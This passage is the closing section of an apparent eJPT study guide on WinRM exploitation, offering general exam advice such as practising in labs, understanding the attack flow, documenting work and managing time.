- **Practice labs:** Try different scenarios to build confidence

---

## Final Notes for eJPT Success

WinRM exploitation is a fundamental skill for Windows penetration testing. Key points for exam success:

- **Practice with real labs** until commands become automatic
- **Understand the attack flow** from discovery to full compromise
- **Know common troubleshooting** for when things don't work immediately  
- **Document everything** during practice to build good habits
- **Time management** is crucial - practice under time pressure

This comprehensive guide covers everything needed to master WinRM exploitation for both professional penetration testing and eJPT exam success. Regular practice with the commands and scenarios will build the confidence and muscle memory needed for success in time-pressured exam situations.
